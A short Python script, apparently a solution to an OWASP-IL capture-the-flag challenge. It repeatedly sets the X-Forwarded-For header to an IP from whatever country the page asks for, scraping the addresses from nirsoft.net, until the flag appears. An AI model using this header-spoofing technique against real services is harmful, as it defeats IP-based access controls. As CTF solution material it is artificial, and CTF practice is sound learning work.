#!/usr/bin/python
import re
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_next_ip(country_name):
    code = re.search(r'{0}\s([A-Z][A-Z])'.format(country_name), country_codes).group(1).lower()
    new_url = "https://www.nirsoft.net/countryip/{0}.html".format(code)
    response = requests.get(new_url, verify=False)
    new_ip = re.findall(r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}', response.text)[2]
    return new_ip


#
# Global Configurations
#

country_codes = open("country_codes").read()
url = 'http://challenges.owaspil.ctf.today:8094/'
headers = {}

session = requests.session()
response = session.get(url)

for i in xrange(17):
    country_name = str(response.content).split("from")[1].split("(")[0].strip()
    new_ip = get_next_ip(country_name)

    print "[+] country {0} ip {1}".format(country_name, new_ip)
    headers['X-Forwarded-For'] = new_ip

    response = session.get(url, headers=headers)
    if "OWASP-IL" in response.text:
        print "[*] {0}".format(response.text)
